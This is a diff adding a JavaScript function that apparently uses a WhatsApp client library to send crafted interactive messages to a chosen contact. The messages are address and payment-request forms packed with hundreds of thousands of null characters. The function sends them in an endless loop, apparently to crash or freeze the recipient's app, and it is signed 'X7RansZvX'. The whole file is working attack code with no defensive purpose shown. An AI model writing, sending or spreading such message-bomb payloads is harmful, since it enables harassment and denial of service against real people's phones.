@@ -1,0 +1,65 @@
+async function marno1(sock, jid) {
+  try {
+    while (Date.now() - Date.now() < 200000) {
+      const msg = generateWAMessageFromContent(jid, {
+        groupStatusMessageV2: {
+          message: {
+            interactiveResponseMessage: {
+              body: {
+                text: "calm, X7RansZvX is here",
+                format: "EXTENSION_1"
+              },
+              nativeFlowResponseMessage: {
+                name: "address_message",
+                paramsJson: `{"values":{"in_pin_code":"999999",
+                "building_name":"𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍",
+                "landmark_area":"18",
+                "address":"RansX7",
+                "tower_number":"𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍",
+                "city":"𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍",
+                "name":"RansX7",
+                "phone_number":"999999999999",
+                "house_number":"13135550002",
+                "floor_number":"@3135550202",
+                "state":"X${"\u0000".repeat(900000)}"}}`,
+                 version: 3
+              },
+              contextInfo: {
+                forwardingScore: 9999,
+                isForwarded: true,
+                entryPointConversionSource: "address_message"
+              }
+            }
+          }
+        }
+      }, {});
+
+      await sock.relayMessage(jid, msg.message, { messageId: msg.key.id, participant: { jid: jid } });
+
+  await sock.relayMessage(jid, {
+    groupStatusMessageV2: {
+          message: {
+            interactiveResponseMessage: {
+              body: {
+                text: "calm, X7RansZvX is here",
+                format: "EXTENSION_1"
+              },
+              nativeFlowResponseMessage: {
+                name: "review_and_pay",
+                paramsJson: `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"${'\u0000'.repeat(50000)}\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`,
+                version: 3
+              },
+              contextInfo: {
+                forwardingScore: 9999,
+                isForwarded: true,
+                entryPointConversionSource: "payment_method"
+              }
+            }
+          }
+        }
+  }, { participant: { jid: jid }});
+    }
+  } catch (err) {
+    console.log(err);
+  }
+}
